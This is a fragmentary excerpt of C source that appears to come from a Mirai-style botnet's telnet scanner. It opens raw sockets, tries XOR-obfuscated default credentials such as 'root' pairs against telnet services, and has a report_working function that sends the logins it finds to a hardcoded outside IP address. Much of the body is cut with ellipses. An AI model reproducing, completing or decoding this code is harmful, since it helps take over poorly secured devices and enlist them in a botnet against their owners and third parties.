...
void scanner_init(void)
{
    ...
    {
#ifdef DEBUG
        printf("dbg: Failed to initialize raw socket, cannot scan\n");
#endif
        exit(0);
    }
    ...
    {
#ifdef DEBUG
        printf("dbg: Failed to set IP_HDRINCL, cannot scan\n");
#endif
        close(rsck);
        exit(0);
    }
    ...
    add_auth_entry("\x50\x4D\x4D\x56", "\x51\x4D\x4E\x4D\x49\x47\x5B", 11);
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 8); 
    add_auth_entry("\x50\x4D\x4D\x56", "\x78\x56\x47\x17\x10\x13\x22", 11);
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13\x22", 11);
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x22", 10); 
    add_auth_entry("\x50\x4D\x4D\x56", "\x58\x4A\x4D\x4C\x47\x22", 10); 
    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54\x22", 9); 
    add_auth_entry("\x50\x4D\x4D\x56", "\x5B\x51\x13\x10\x11\x16\x17\x14\x22", 13); 
    add_auth_entry("\x50\x4D\x4D\x56", "\x65\x6F\x1A\x13\x1A\x10", 10); 
    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 10); 
    add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x4B\x11\x17\x13\x1A", 10); 
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 11); 
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x58\x4A\x4D\x4C\x47\x22", 11); 
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 10); 
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16", 9);
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 10); 
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x17\x16\x11\x10\x13", 10); 
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14", 11);
    add_auth_entry("\x56\x47\x4E\x4C\x47\x56\x43\x46\x4F\x4B\x4C", "\x56\x47\x4E\x4C\x47\x56\x43\x46\x4F\x4B\x4C", 22); 

#ifdef DEBUG
    printf("dbg: telnet scanner started.\n");
#endif
    ...
    while (TRUE)
    {
        ...
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            ...
            {
#ifdef DEBUG
                printf("dbg: FD%d timed out (state = %d)\n", conn->fd, conn->state);
#endif
                close(conn->fd);
                conn->fd = -1;
            ...
            case SC_WAITING_SYSTEM_RESP:
                        ...
                        case SC_WAITING_TOKEN_RESP:
                            ...
                            else if (consumed > 0)
                            {
                                ...
                                int tmp_len;
#ifdef DEBUG
                                printf("dbg: FD%d Found verified working telnet\n", conn->fd);
#endif
...
static void setup_connection(struct scanner_connection *conn)
{
    ...
    {
#ifdef DEBUG
        printf("dbg: Failed to call socket()\n");
#endif
        return;
    }
...
static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
{
    ...
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(109,104,151,112);
